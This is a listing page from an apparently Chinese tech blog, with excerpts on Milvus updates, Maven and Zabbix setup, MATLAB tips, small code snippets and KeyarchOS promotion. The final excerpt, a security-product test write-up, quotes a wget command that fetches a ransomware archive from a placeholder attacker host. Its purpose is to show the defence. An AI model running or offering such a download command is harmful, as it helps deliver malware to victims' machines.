Core Updates #28720 #28803 #28692 #28470 Milvus社区正在对delete和compaction逻辑进行一系列优化，会像其他WAL架构的数据库一样，使用一层Level 0 segment存储删除记录，此优化后会使得整体的写入逻辑更清晰，compaction架构上更简洁，详细设计见 https://github.com/milvus-io/milvus/issues/27675
#28272 Bulk Insert支持Array类型，补齐了批量导入的能力
#28622 segment动态平衡策略中加入了growing segment行数，Milvus的segment分为growing和sealed两类，在此之前的平衡策略中，只考虑了sealed segment，对于导入数据过程中的collection绝大部分数据都是在growing segment中，会导致数据极度倾斜，加入growing segment行数后能大大缓解此问题。
#28319 为Milvus增加access log功能，运维用户可以通过access log做业务用户行为分析、故障分析等，详细的配置详见 https://github.com/milvus-io/milvus/issues/28086
#28608 Bulk insert支持导入parquet格式。parquet是数据、AI领域非常常见的格式，支持parquet后用户将Milvus和现有的数据系统集成会更容易。
#28878 很多用户反馈升级到2.3.x后在旧cpu机型上Milvus无法启动，经过排查发现是Milvus使用的依赖folly库编译参数导致，此PR修复了该问题
Knowhere #219 在topk很大时，将hnsw索引查询退化成暴力搜索，以提升性能 #221 修复hnsw M==1时会crash的问题 #233 修复arm neon指令集下hamming距离计算问题 #238 为diskann索引支持mmap
Backup #246 支持本地文件系统
Birdwatcher #222 新增命令collection-meta-leaked，清理已经被删除的collection #220 支持删除不存在的key #224 为verify-segment命令增加fix参数，修复segment元数据
New Contributor Welcome junjiejiangjjj What's Up Next 发布2.3.4版本
Did you know Milvus支持内存多副本功能，用于高可用、扩展性强的场景，具体的介绍详见 https://milvus.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac4cab9d1e71969904aa2f11df4c0eba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0fc1559a8f89aa5ed7e148164dac99b5/" rel="bookmark">
			1.1配置开发环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、虚拟机 虚拟机可以安装vmware社区板，再在Ubuntu系统下载https://cn.ubuntu.com/download
下载Ubuntu操作系统，在vm中安装，具体可以参考（感谢这名作者）VMware虚拟机安装Ubuntu与配置Ubuntu（超详细教程）_vmware和ubuntu_Tfly__的博客-CSDN博客https://blog.csdn.net/weixin_55944949/article/details/130255886
二、Linuxone linuxone是一个远程的服务器，由IBM社区出品，只需要一个电子邮件即可注册使用。
你可以在[白嫖系列]白嫖 IBM LinuxOne 服务器教程 - 北极找北 - 博客园 (cnblogs.com)https://www.cnblogs.com/nofta/p/17213150.html
了解如何申请linuxone服务器
接下来，我们需要安装一个连接工具——mobaxterm。 https://download.mobatek.net/2342023101450418/MobaXterm_Installer_v23.4.ziphttps://download.mobatek.net/2342023101450418/MobaXterm_Installer_v23.4.zip打开软件，点击
使用私钥导入私钥文件（*.pem，在官网申请以后下载的） ,之后点击ok，点击名称，打开虚拟机。
这里写linux1
出现下图就表示登陆成功了。
之后，大家可以尝试安装Linux双系统（出现问题，概不负责），这篇文章就到这里了，下期再见！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af446d6d8c6d46f2fff2d41683d7c260/" rel="bookmark">
			Windows10下Maven3.9.5安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.下载maven2.安装3.配置系统变量3.1.新建系统变量 MAVEN_HOME3.2.编辑系统变量Path 4.CMD命令测试是否安装成功5.配置maven本地仓库6.配置国内镜像仓库 1.下载maven 官网
https://maven.apache.org/download.cgi
点击下载。
2.安装 解压到指定目录
D:\installSoft\apache-maven-3.9.5
3.配置系统变量 3.1.新建系统变量 MAVEN_HOME 变量名：MAVEN_HOME
变量值：安装目录
3.2.编辑系统变量Path 添加一行%MAVEN_HOME%\bin如图
4.CMD命令测试是否安装成功 运行mvn -v如图
出现上面信息说明成功了。
5.配置maven本地仓库 打开maven目录下conf 文件夹下的 settings.xml
&lt;localRepository&gt;E:\download\mavenStore&lt;/localRepository&gt;
6.配置国内镜像仓库 为了提高下载速度
&lt;!-- 配置阿里云镜像仓库 --&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;mirror&gt; 如图
注意：需要放在&lt;mirrors&gt; 标签里面
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10bd01b2b5570d79da9f1beacaadae9f/" rel="bookmark">
			谢宁老师受邀在浙商企业家研习班中讲授华为战略规划SP实践（业务领先模型BLM）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着全球经济持续的发展与变革，企业家们正面临着前所未有的挑战和机遇。如何在不断变化的市场环境中保持稳健发展，如何进行高效的投资，是众多企业家必须深思的重要问题。
为了协助企业家们更好地应对这些挑战，近日，在乌镇，谢宁老师受邀在浙商企业家研习班中讲授华为战略规划SP实践（业务领先模型BLM）。来自庞度纸业、浦江凯瑞生物科技股份、浙江恒强针车集团、浙江港流高分子科技股份、浙江微盾环保科技股份等多家企业的企业家/二代企业家团队共聚一堂，深度参与了本次学习及实战演练。
谢宁老师、行业专家和成功企业家不仅分享了他们的经验和见解，还与学员进行了互动交流，帮助学员更好地把握行业动态和市场趋势。这些专家和企业家不仅具有丰富的实践经验，还具备深厚的理论素养，让学员能够从多个角度了解行业和市场的情况。
除了理论知识的学习，还强调实践操作和实践经验的分享。学员通过案例分析和实际操作来巩固和运用所学知识。同时，还将与同学进行交流和互动，分享彼此的经验和心得，以便更好地提升自己的能力和拓展人际关系。
企业家不能只顾低头拉车，不管抬头看路。战略须从逻辑上跑通大方向，行动上才能落实细节。把公司战略解码分解到员工身上的责任，变成员工自己的规划，才能让组织承接战略解码的任务。
谢宁老师作为华为培训管理部特聘资深讲师和顾问，担任多家企业的常年顾问和教练。曾在华为等知名高科技企业担任项目管理总监、战略和运营副总职位，现专注于战略转型、DSTE开发战略到执行、BLM业务领先、BEM战略解码、IPD产品管理及研发管理、华为流程和运营管理等领域的培训、咨询和高管教练。
谢宁老师拥有20多年的企业相关经验与战略管理、产品及研发管理咨询经验，也是国内讲授华为研发管理IPD、战略管理BLM和战略解码课程最多和最受欢迎的讲师之一。
————————
谢宁老师专著《华为战略管理法：DSTE实战体系》荣幸入选本届中国企业领袖读享盛典“2023年度中国企业阅读新书推荐榜”。
——————————
推荐参考阅读的长文链接：
1、【1.6万字长文】华为战略管理方法论介绍（含开发战略到执行DSTE、业务领先模型BLM、业务执行力模型BEM、组织绩效战略解码）
2、超级福利：分享谢宁老师版权所有的《华为集成产品开发管理IPD（华为研发管理实践精华）-谢宁老师华为大学授课》课件资料
3、（1.5万字干货图文）解读华为集成产品开发IPD之市场管理流程（MM流程）
4、【2023年战略管理公开课计划】向华为学习业务领先的战略规划SP（BLM）和战略解码BP（BEM）
————————————
谢宁老师，华为培训管理部特聘资深讲师和顾问，专著《华为战略管理法：DSTE实战体系》、《智慧研发管理》。战略转型与战略解码专家、产品创新、IPD研发管理专家，具有美国项目管理协会PMP认证资格。曾在华为等知名高科技企业担任项目经理、项目管理总监、运营总监职位，现专注于战略转型、DSTE开发战略到执行、BLM业务领先、BEM战略解码、IPD产品管理及研发管理等咨询和培训。 商务请扫码或者添加微信DSTEIPD联系。
————————
点击“阅读原文”立即购买《华为战略管理法：DSTE实战体系》
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd1b9568baa7c0dd88e442320d0d4426/" rel="bookmark">
			华为变革进展指数TPM的五​个级别：试点级、推行级、功能级、集成级和世界级
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		华为变革进展指数TPM的五​个级别：试点级、推行级、功能级、集成级和世界级
TPM（Transformation Progress Metrics，变革进展指标）用来衡量管理体系在华为的推行程度和推行效果，并找出推行方面的不足与问题，不断改进，推动革新与学习，提高业务与管理水平。
正如华为轮值CEO郭平2014年6月16日在华为“蓝血十杰”颁奖大会上的致辞：经过十五年努力，华为的管理方式已经从定性走向定量，从“语文”走向“数学”，实现了基于数据、事实和理性分析的实时管理。
谢宁老师认为，TPM是一种采用量化数据衡量变革进展及成果的方法。TPM将管理体系的成熟度评估划分为五个层级：试点级、推行级、功能级、集成级和世界级，如图所示。
图 TPM的评估标准
例如，IPD的TPM的推行进展分为5个级别：试点级、推行级、功能级、集成级和世界级，分别对应着1、2、3、4、5分。华为曾聘请IBM的IPD专家对当时的研发管理体系评分：华为2003年的平均分只有1.8，2004年达到2.3，而当年的目标是2.7。按照IBM专家意见，一家真正管理高效规范的跨国公司，其TPM分值应达到3.5。任正非2016年8月13日在华为公司IPD建设蓝血十杰暨优秀XDT颁奖大会的讲话提到“历经八年，研发IPD团队从2008年的3.2分提高到今天的3.6分，这0.4分是跨时代的进步。因为3.5分以下的IPD开发是相对封闭的，封闭在研发内部，没有与相关流程关联，这0.4分代表IPD与相关流程关联了，做到这样的突破，为公司“万里长城”的发展奠定了坚实的基石。”
不同管理体系的TPM评估标准包含的内容不太一样，需要结合管理体系自身特点和标杆实践来确定。例如，IPD的TPM包含九个领域：业务分层、异步开发、结构化流程、基于团队的管理、产品开发、有效的衡量标准、项目管理、共用基础模块、项目管理和以客户为中心的设计。每一个领域的TPM都有七项评估项目：符合度、及时性、战略、完整性、准确性、效率/成本及受控。
每个评估领域都会有一组细分的问题，帮助评估者理解在给各评估领域评分时应该考虑哪些维度和内容，这些问题帮助公司决定采取什么行动以持续改进工作。问题随着变革进展过程中的持续改进可能需要随之发生一些变化。每个问题将从推行程度和效果两个维度进行打分，打分标准如表所示。
推行程度
效果
得分
打分标准
得分
打分标准
0%
未实践
0%
未实践：成效不明显
1-20%
试点：受控，有限的引入
1-20%
试点：有部分成效。流程有较大缺陷
21-40%
推行: 在部分产品线/产品系列中开始推行
21-40%
推行：关键衡量指标有部分改进。运作稳定。流程缺陷较小
41-60%
功能：在大多数产品线/产品系列中进行推行。行为正在发生变化
41-60%
功能：大多数衡量指标得到改进。实施有成效
61-80%
集成：完成推行。文化已经变化
61-80%
集成：大多数衡量指标有很大改进。实施非常有效。流程没有缺陷。
81-100%
世界级：及时与新的IPD构想不断保持一致
81-100%
世界级：实施质量不断提高
表 TPM的评估标准
TPM的评估方式是参与评估的人员通过沟通，给每个问题打统一的一个分，而不是每个评估人员各自打自己的分。采用增量打分，即在前一次得分基础上，根据本期所做的工作，对前一次的得分进行修正。同时对分数上升和下降的原因进行说明，形成会议纪要的内容。在评估中，对问题进行排序，输出优先级高的问题清单及行动计划。
（本文摘自谢宁专著《华为战略管理法：DSTE实战体系》，欢迎购买）
END
————————
谢宁老师专著《华为战略管理法：DSTE实战体系》荣幸入选本届中国企业领袖读享盛典“2023年度中国企业阅读新书推荐榜”。
——————————
推荐参考阅读的长文链接：
1、【1.6万字长文】华为战略管理方法论介绍（含开发战略到执行DSTE、业务领先模型BLM、业务执行力模型BEM、组织绩效战略解码）
2、超级福利：分享谢宁老师版权所有的《华为集成产品开发管理IPD（华为研发管理实践精华）-谢宁老师华为大学授课》课件资料
3、（1.5万字干货图文）解读华为集成产品开发IPD之市场管理流程（MM流程）
4、【2023年战略管理公开课计划】向华为学习业务领先的战略规划SP（BLM）和战略解码BP（BEM）
————————————
谢宁老师，华为培训管理部特聘资深讲师和顾问，专著《华为战略管理法：DSTE实战体系》、《智慧研发管理》。战略转型与战略解码专家、产品创新、IPD研发管理专家，具有美国项目管理协会PMP认证资格。曾在华为等知名高科技企业担任项目经理、项目管理总监、运营总监职位，现专注于战略转型、DSTE开发战略到执行、BLM业务领先、BEM战略解码、IPD产品管理及研发管理等咨询和培训。 商务请扫码或者添加微信DSTEIPD联系。
————————
点击“阅读原文”立即购买《华为战略管理法：DSTE实战体系》
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1968380ee414cc617cd21a226f20cc97/" rel="bookmark">
			MATLAB|学习小提示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Part1一些小小小提示 1遇到问题怎么办 不要怕提问，谁都是新手过来的，matlab程序我是自学的从来也没人教过我，我不懂就百度解决的，作为初学者，你遇到的问题，其他人也大多遇到过，绝大多数百度可以解决。但是在提问之前，可以看看作为一个过来人给你们的一点经验
勇于自己尝试 不能程序一出错，就直接来群里问，先想办法自己解决，找到问题的原因 不能因为报错的是一大段因为字母就放弃自己找原因，尝试自己读一读 找到报错的关键。
善用搜索、 GPT寻找关键思路 一定要善用百度，谷歌等搜索引擎或者GPT，因为实际上网络上和你遇到相同问题的人是非常多的，别人有写博客的习惯，错了就记录下来 要善于筛选，有可能错误和你不是一模一样但是差不多，要懂得变通
摆正心态 提问的时候，一定要摆正心态，不能因为没人帮你解答，或者没人理你就生气懊恼，情商是一门艺术，需要自己去体会。
2MATLAB遇到问题怎么办？到哪找资源？ 最常见的就是百度啦！
中文的 MATLAB 社区论坛：https://www.ilovematlab.cn/
国外一个大佬的个人博客：https://undocumentedmatlab.com/
外网知乎：https://www.quora.com/topic/MATLAB
这里我最推荐的是去官方提问：
我每次提问，快点几分钟、最迟也就半个小时就会有人给出建议方法和思路代码。
而且我感觉他们就是在线的真正的“人工”智能。那些大佬每次都抢着回答，需要注意的是在回复后，你一定要记得点击采纳别人的意见，这是对别人的认可和尊重。
其次是GPT提问
免费MATLAB代码下载： https://www.jcbrolabs.org/matlab-codes
免费的国外MATLAB教程：https://www.sharetechnote.com/html/Handbook_Matlab_Index.html
当然少不了 MATLAB 官网教程啦https://uk.mathworks.com/help/index.html?s_tid=CRUX_lftnav
MATLAB 官方博客：https://blogs.mathworks.com/?s_tid=gn_mlc_blg
官网绘图案例代码：https://uk.mathworks.com/products/matlab/plot-gallery.html
3常见的开源平台： GitHub GitHub是一个基于Git版本控制系统的代码托管平台。开发者可以在GitHub上托管和共享代码，协作开发，并使用问题跟踪、请求合并等功能。
GitHub https://github.com/
GitLab GitLab是一个基于Git的完整DevOps平台，除了代码托管外，还提供CI/CD、问题跟踪、代码审查等工具，支持自托管。
GitLab https://about.gitlab.com/
Bitbucket Bitbucket是由Atlassian提供的代码托管平台，支持Git和Mercurial版本控制系统，提供与Jira等工具的无缝集成。
Bitbucket https://bitbucket.org/
SourceForge SourceForge是一个开源软件托管平台，提供代码托管、问题跟踪、论坛等功能。曾是开源项目的主要托管地之一。
SourceForge https://sourceforge.net/
Docker Hub Docker Hub是Docker容器的镜像仓库，开发者可以在其中分享和获取Docker镜像，方便在不同环境中部署应用。
Docker Hub：https://hub.docker.com/
Gitee（码云） Gitee，又称码云，是中国的一家代码托管平台，支持Git和SVN，提供与国内开发者相关的服务，包括加速、CI/CD等。
Gitee https://gitee.com/
Apache Software Foundation Apache Software Foundation（ASF）是一个非营利性组织，致力于支持Apache软件项目的发展。它提供了很多重要的开源软件。
Apache Software Foundation https://www.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1968380ee414cc617cd21a226f20cc97/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5ea6660b75bf8b65b8bbb0609395cb3/" rel="bookmark">
			eclipse 启动springboot进入exitCurrentThread异常
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		window-preference-java-debug 去掉第一个√ 即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/927e37f2d1b67f2e76e0cf61a4d5b62a/" rel="bookmark">
			js 防抖函数、节流函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		/** 节流函数 */ export function throttle(func, wait = 100) { let isDoing = false return function (...rest) { if (isDoing) return isDoing = true setTimeout(() =&gt; { func(...rest) isDoing = false }, wait) } } /** 防抖函数 */ export function debounce(func, wait = 100) { let timer = 0 return function (...rest) { clearTimeout(timer) timer = setTimeout(func, wait, ...rest) } } //测试 function throttle(func, wait = 100) { let isDoing = false return function (.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/927e37f2d1b67f2e76e0cf61a4d5b62a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d913705151c57d77639cc38f90bad2d0/" rel="bookmark">
			zabbix概述及在KeyarchOS系统安装Zabbix4.2.5及启用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1 概述
2 安装准备
2.1 操作系统环境
2.2 Zabbix版本
3 安装
3.1 安装Zabbix官方yum源
3.2 安装Zabbix
3.3 安装MariaDB
4 运行Zabbix
4.1 配置Zabbix
4.2 启动Zabbix
1 概述 浪潮信息KOS是浪潮信息基于Linux Kernel、OpenAnolis等开源技术自主研发的一款服务器操作系统，支持x86、ARM等主流架构处理器，性能和稳定性居于行业领先地位，具备成熟的 CentOS 迁移和替换能力，可满足云计算、大数据、分布式存储、人工智能、边缘计算等应用场景需求。详细介绍见官网链接浪潮信息KOS服务器操作系统-服务器操作系统-浪潮信息。
Zabbix 是一个企业级分布式开源监控解决方案，能够监控众多网络参数和服务器的健康度、完整性。Zabbix 使用灵活的告警机制，允许用户为几乎任何事件配置基于邮件的告警，这样用户可以快速响应服务器问题。Zabbix 基于存储的数据提供出色的报表和数据可视化功能。详细介绍见官网链接Zabbix：企业级开源监控解决方案。
2 安装准备 2.1 操作系统环境 版本信息：KeyarchOS 5.8sp1
硬件平台：X86_64
2.2 Zabbix版本 Zabbix-5.4-1
https://repo.zabbix.com/zabbix/5.4/rhel/8/x86_64/zabbix-release-5.4-1.el8.noarch.rpm
3 安装 3.1 安装Zabbix官方yum源 首先配置官网yum源，方便后续安装：
rpm -Uvh https://repo.zabbix.com/zabbix/5.4/rhel/8/x86_64/zabbix-release-5.4-1.el8.noarch.rpm
3.2 安装Zabbix 1、安装Zabbix server、Web前端、agent：
yum install zabbix-server-mysql zabbix-web-mysql zabbix-nginx-conf zabbix-sql-scripts zabbix-agent
3.3 安装MariaDB 1、安装mariadb，直接使用yum命令安装即可：
yum install mariadb-server -y
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d913705151c57d77639cc38f90bad2d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96b47b5ea7b3b06425b0c1cb486e7ab3/" rel="bookmark">
			minigpt4/minigpt-v2批量推理/测试的代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近很多人需要关于minigpt4/minigpt-v2批量推理/测试的代码，而且不需要gradio。我来贡献一下我写的，其实特别简单，就是把gradio那边改了就可以：
单张测试 # 前面不用改 # ======================================== # Model Initialization # ======================================== conv_dict = {'pretrain_vicuna0': CONV_VISION_Vicuna0, 'pretrain_llama2': CONV_VISION_LLama2} print('Initializing Chat') args = parse_args() cfg = Config(args) model_config = cfg.model_cfg model_config.device_8bit = args.gpu_id model_cls = registry.get_model_class(model_config.arch) model = model_cls.from_config(model_config).to('cuda:{}'.format(args.gpu_id)) CONV_VISION = conv_dict[model_config.model_type] vis_processor_cfg = cfg.datasets_cfg.cc_sbu_align.vis_processor.train vis_processor = registry.get_processor_class(vis_processor_cfg.name).from_config(vis_processor_cfg) stop_words_ids = [[835], [2277, 29937]] stop_words_ids = [torch.tensor(ids).to(device='cuda:{}'.format(args.gpu_id)) for ids in stop_words_ids] stopping_criteria = StoppingCriteriaList([StoppingCriteriaSub(stops=stop_words_ids)]) chat = Chat(model, vis_processor, device='cuda:{}'.format(args.gpu_id), stopping_criteria=stopping_criteria) print('Initialization Finished') # ================测试一张========================= # text input USER_ANS_FORMAT = '' # 新代码 # 上传图片 # 图片地址 gr_img = '' chat_state = CONV_VISION.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96b47b5ea7b3b06425b0c1cb486e7ab3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8719c7d721ce00147989c97cb800f73/" rel="bookmark">
			c&#43;&#43; protobuf varint 简单编码和解码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;iostream&gt; using namespace std; // 小端存储 int varintEncode(int n, unsigned char *bytes) { int idx = 0; while (true) { // 只有低7位，高位全部为0 if ((n &amp; ~0x7f) == 0) { // 除低7位，全部为0 bytes[idx++] = (char) n; break; } else { // 除低7位，不全部为0 bytes[idx++] = ((unsigned char) ((n &amp; 0x7f) | 0x80)); // 高1位置1，低7位按位与得到实际值 n = n &gt;&gt; 7; } } return idx; } // 小端恢复 int varintDecode(unsigned char *bytes) { int idx = 0; int shift = 0; int result = 0; while (true) { unsigned char b = bytes[idx++]; result |= ((b &amp; 0x7f) &lt;&lt; shift); // 判断最高位是否为0 if ((b &gt;&gt; 7) == 0) { break; } shift += 7; } return result; } int main() { for (int i = 1; i &lt; 1000000; i++) { unsigned char bytes[5]{0}; if (i !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8719c7d721ce00147989c97cb800f73/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c00b51ce1a396973112c44aa189504d2/" rel="bookmark">
			国产操作系统的春天——KeyarchOS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、KeyarchOS是什么？稳定可靠高效协同全天候运维广泛兼容 二、如何完成 CentOS 迁移替换？迁移难点迁移方案 三、未来服务器操作系统的展望产品创新生态环境 前言 2020 年，CentOS 项目与红帽联合宣布将全部投资转向 CentOS Stream， 这是未来红帽企业 Linux 发行版的上游开发平台。因此，CentOS Linux 7 将于 2024 年 6 月 30日停止维护，终止其生命周期。
这也就意味着，如果我们运行的是CentOS Linux7的话，我们需要在2024 年 6 月 30 日之前迁移到新的操作系统，这样才能继续获得安全更新、补丁和新功能。
那么我会选择哪一款操作系统尼？
我肯定会毫无疑问的去选择国产操作系统：KeyarchOS，至于为什么，请听我慢慢给大家分析
一、KeyarchOS是什么？ 浪潮信息KOS是浪潮信息基于Linux Kernel、OpenAnolis等开源技术自主研发的一款服务器操作系统，支持x86、ARM等主流架构处理器，性能和稳定性居于行业领先地位，具备成熟的 CentOS 迁移和替换能力，可满足云计算、大数据、分布式存储、人工智能、边缘计算等应用场景需求。
那么国产数据库KeyarchOS有哪些特点和优势尼？
稳定可靠 浪潮信息KOS提供RAS增强、应用高可用等能力，在安全可信方面实现全栈可信链，内置EDR安全加固套件，有效保障业务的连续性和可靠性
高效协同 浪潮信息KOS通过软硬协同调度优化，基于浪潮信息KOS的人工智能、虚拟化、云原生等应用在开发效率、运行效率、扩展性等方面都得到了增强
全天候运维 浪潮信息KOS提供深度监控、专家诊断规则、云端运维服务接入等能力，支持超过700余种深度监控数据，支持基于专家规则的自动化运维和诊断，可以无缝接入到浪潮信息InService云端运维服务
广泛兼容 依托上下游合作伙伴的广泛合作，浪潮信息KOS完成大量兼容认证，覆盖服务器整机100余款、板卡350余款、数据库100余款、中间件150余款
二、如何完成 CentOS 迁移替换？ 我们公司的业务涉及到许许多多的业务系统，包括Cent7.下的好几个子版本，应用开发涉及到Python、Java、Go、PHP等，其中系统组件包括了redis、rabbitmq、nagin等数据库和中间件，因为CentOS有些版本已经陆续开始停服了，这对公司带来了巨大的风险，所以必须考虑到迁移工作的准备，其实考虑过许多商业版的操作系统，最后还是把眼光看到了浪潮信息 KeyarchOS。
因为我们觉得KeyarchOS 广泛兼容市场主流软硬件，能够保障用户业务稳定、安全、高效运行，为应对 CentOS 停服打造了完整解决方案，可满足不同场景的用户需求，助力用户业务平滑迁移。
迁移难点 因为业务的规模非常大，分类也比较广，所以系统如何能够安全并且稳定的迁移是我们在迁移过程中考虑的最重要的一个因素迁移过程中涉及到的语言、驱动、组件、容器等数量十分的多，包括中间件、数据库、容器、依赖还有一些业务具体的组件因为被迁移的系统支持着公司许多核心商业业务(盈利的命脉)的正常运行的核心，比如广告系统，所以我们在迁移过程中必须保证这些业务在迁移前后必须时稳定运行的 迁移方案 其实在迁移过程中主要是针对CentOS操作系统进行替换，所以我就大概说一下整体迁移流程，因为我们目前还是处于模拟阶段还没有进行实际的迁移，所以大致分为几个步骤：配置环境，实际迁移，监控这三个步骤
大概就是在新服务器上安装KeyarchOS操作系统并且配置相关的环境并且下载好相应的软件，然后使用相应的迁移工具，比如X2Keyarch来将CentOS的配置信息和一些数据迁移到新的系统当中。
后续就是对迁移后运行的项目进行实时的监控，因为我们模拟迁移的时候只进行了一部分业务的迁移，在迁移之后，将这些基础业务成功的配置运行在了KeyarchOS上，业务各项功能也是正常提供服务各项指标也是正常，不仅如此，性能方面也是有所提升。
其实我觉得KeyarchOS在迁移方面有以下几个特点：
KeyarchOS提供有迁移工具可以实现自动化迁移可以节约我们迁移之后适配，人工迁移的一个成本性能也得到了一些提升 三、未来服务器操作系统的展望 产品创新 我觉得操作系统的发展离不开创新。目前自主芯片+自主服务器操作系统组成的计算机底座发展的越来越广泛，但我觉得用户需要的是一款既可以部署在物理服务器和虚拟化环境、也可以支持私有云、公有云和混合云部署的服务器操作系统
生态环境 大家都知道，操作系统不仅需要向下广泛支持连接和适配各种硬件，包括CPU、内存、主板等等，向上要对接各种各样的软件，包括数据库、中间件和各种各样的语言应用软件，只有广泛、良性的生态，操作系统的发展才会越来越好
就目前操作系统的发展情况来看，以后的操作系统可能会往几个方向发展：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c00b51ce1a396973112c44aa189504d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b46a3a23a3e955ea6af28222f3f3f13/" rel="bookmark">
			浪潮信息KeyarchOS——保卫数字未来的安全防御利器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		浪潮信息KeyarchOS——保卫数字未来的安全防御利器
前言
众所周知，目前流行的操作系统有10余种，每一款操作系统都有自己的特点。作为使用者，我们该如何选择操作系统。如果你偏重操作系统的安全可信和稳定高效，我推荐你使用浪潮信息云峦KeyarchOS；
随着数字化时代的到来，网络威胁不断升级，网络安全变得愈发重要。浪潮信息KeyarchOS操作系统，搭载着先进的EDR（终端威胁检测与响应）工具，成为了保护数字世界的重要工具。
在我司内部使用的也是KeyarchOS操作系统，其安全性一直没有出过问题。为了提前预防，本文将体验浪潮信息KeyarchOS在防范勒索病毒、挖矿病毒、网页篡改以及DDOS攻击方面的表现。
产品优势
KeyarchOS作为一款基于Linux内核、龙蜥等开源技术自主研发的服务器操作系统。具有以下优势：
高效稳定：KeyarchOS经过多年的研发和测试，具有高效稳定的性能。它能够保证用户业务稳定，可靠，高效运行，减少系统故障和停机时间。
广泛兼容：KeyarchOS整合了ANCK内核，可广泛兼容市场芯片，板卡，数据库，中间件等软硬件，为用户提供全面的解决方案。
安全可信：KeyarchOS具有全栈安全可信的特性，能够保护用户数据的安全性和隐私性。它还通过了多项安全认证和测试，可满足用户对安全性需求；符合关键行业应用要求。
高效运维：KeyarchOS还提供全天候运维支持，为用户提供及时的技术和故障排除服务。此外，它还提供了智能监控和管理工具，方便用户进行系统管理和优化。
多元算力价值：KeyarchOS可为用户提供多元算力价值，通过整机系统架构优化，最大程度发挥多元算力价值。有助于提高用户业务的效率和竞争力。
技术实力强：浪潮信息依托十余年的高端主机操作提供研发和龙蜥社区最新的成果，KeyarchOS具有更强的技术实力和更丰富的功能。它采用了最先进的技术和算法，能够提供更加稳定的性能体验。
迁移方案量身定制：KeyarchOS可为用户量身打造整体迁移方案，使业务系统安全可靠地切换到浪潮信息KeyarchOS。这为用户提供了更加便捷的迁移体验，减少了迁移成本和风险。
全面解决方案：KeyarchOS覆盖云，数，智，边等业内最全整机产品线，能够满足不同用户的需求，提供更加全面的解决方案。无论是云计算，大数据，人工智能等领域的应用场景浪潮信息KeyarchOS都能够提供全部支持。
基本环境
EDR管理中心（C）：未安装EDR agent。
KeyarchOS主机（A）：已安装EDR agent。
KeyarchOS主机（B）：未安装EDR agent。
攻击防护测试
随着数字化时代的飞速发展，网络威胁不断进化，网络安全已然变得至关重要。KeyarchOS操作系统作为保护数字世界的重要防线，凭借极其强大的EDR（终端威胁检测与响应）工具，为用户提供了坚实的防护屏障。以下将详细讲解KeyarchOS EDR在防范勒索病毒，挖矿病毒，网页篡改以及DDOS攻击防护方面的卓越表现。
1.勒索病毒防护
勒索病毒是一种常见的恶意软件，常常通过钓鱼邮件的方式入侵用户主机。一旦入侵成功，勒索病毒会对主机上的设备和数据进行加密或锁定，并使用暴力破解等手段在局域网横向渗透。为了应对这种威胁，KeyarchOS主机安装了EDR（终端威胁检测与响应）工具。通过在不同阶段提供全面的防护，KeyarchOS主机和EDR工具可以帮助用户有效防范勒索病毒和其他网络威胁，保护数字世界的稳定和安全。
已知勒索病毒防护
在勒索病毒入侵阶段，通常会在目标机器终端执行类似命令：“wget -r -np -nd --no-check-certificate https://IP:/test/existRansom.tar”，该命令的作用是让受害者机器下载攻击者机器上的病毒文件existRansom.tar。
当目标机器上没有安装EDR设备时，existRansom.tar文件顺利进入目标机器。也意味着勒索病毒将进一步恶意破坏宿主设备数据，导致勒索宿主拥有者支付虚拟货币等严重后果。
